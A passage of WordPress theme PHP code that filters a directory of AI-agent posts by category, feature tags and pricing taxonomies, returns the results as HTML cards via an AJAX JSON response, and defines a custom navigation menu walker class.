            'taxonomy' => 'ai-agent-category',
            'field' => 'slug',
            'terms' => $category,
        );
    }

    // Add features filter
    if (!empty($features)) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-agent-tag',
            'field' => 'slug',
            'terms' => $features,
            'operator' => 'AND',
        );
    }

    // Add pricing filter
    if (!empty($pricing)) {
        $args['tax_query'][] = array(
            'taxonomy' => 'ai-agent-pricing-option',
            'field' => 'slug',
            'terms' => $pricing,
        );
    }

    // Set relation for multiple tax queries
    if (isset($args['tax_query']) && count($args['tax_query']) > 1) {
        $args['tax_query']['relation'] = 'AND';
    }

    $query = new WP_Query($args);
    ob_start();

    if ($query->have_posts()):
        while ($query->have_posts()):
            $query->the_post();
            ?>
            <a href="<?php the_permalink(); ?>" class="no-d-hover block bg-[#B3C5FF1A] p-6 rounded-xl h-full flex flex-col border border-[var(--primary)]">
                <div class="flex flex-col flex-1 w-full gap-3">
                    <?php if (has_post_thumbnail()): ?>
                        <?php the_post_thumbnail('medium', ['class' => 'w-full h-[210px] object-cover rounded-md']); ?>
                    <?php else: ?>
                        <img src="https://digitalmarketingsupermarket.com/wp-content/uploads/2025/05/Saly-1.png" alt="<?php the_title(); ?>" class="w-full h-[210px] object-cover rounded-md" />
                    <?php endif; ?>
                    <h1 class="text-[#1B1D1F] text-[20px] font-semibold"><?php the_title(); ?></h1>
                    <p class="text-[#5A6478] text-[14px] font-normal"><?php echo wp_trim_words(get_the_excerpt(), 20); ?></p>
                </div>
            </a>
            <?php
        endwhile;
        wp_reset_postdata();
    else:
        ?>
        <p class="text-center w-full col-span-3"><?php _e('No agents found.', 'wb'); ?></p>
        <?php
    endif;

    $html = ob_get_clean();
    wp_send_json_success(array('html' => $html));
}

class Custom_Nav_Walker extends Walker_Nav_Menu
{
    function start_lvl(&$output, $depth = 0, $args = null)
    {
        $indent = str_repeat("\t", $depth);
        $output .= "\n$indent<ul class=\"submenu pl-4 mt-2\">\n";
    }

    function start_el(&$output, $item, $depth = 0, $args = null, $id = 0)
    {
        $classes = empty($item->classes) ? [] : (array) $item->classes;
        $has_children = in_array('menu-item-has-children', $classes);

        $class_names = join(' ', array_filter($classes));
        $class_names = $class_names ? ' class="' . esc_attr($class_names) . '"' : '';

        $output .= "<li$class_names>";

        $attributes = !empty($item->attr_title) ? ' title="' . esc_attr($item->attr_title) . '"' : '';
        $attributes .= !empty($item->url) ? ' href="' . esc_url($item->url) . '"' : '';
        $attributes .= ' class="block py-2 px-3 hover:bg-[var(--secondary)] rounded"';

        $output .= '<a' . $attributes . '>';
        $output .= apply_filters('the_title', $item->title, $item->ID);
        $output .= '</a>';

        // if ($has_children && $depth === 0) {
        //     $output .= '<span class="ml-2">▼</span>';
        // }
    }

    function end_el(&$output, $item, $depth = 0, $args = null)
    {
        $output .= "</li>\n";
    }

    function end_lvl(&$output, $depth = 0, $args = null)
    {
        $indent = str_repeat("\t", $depth);
        $output .= "$indent</ul>\n";
    }
}
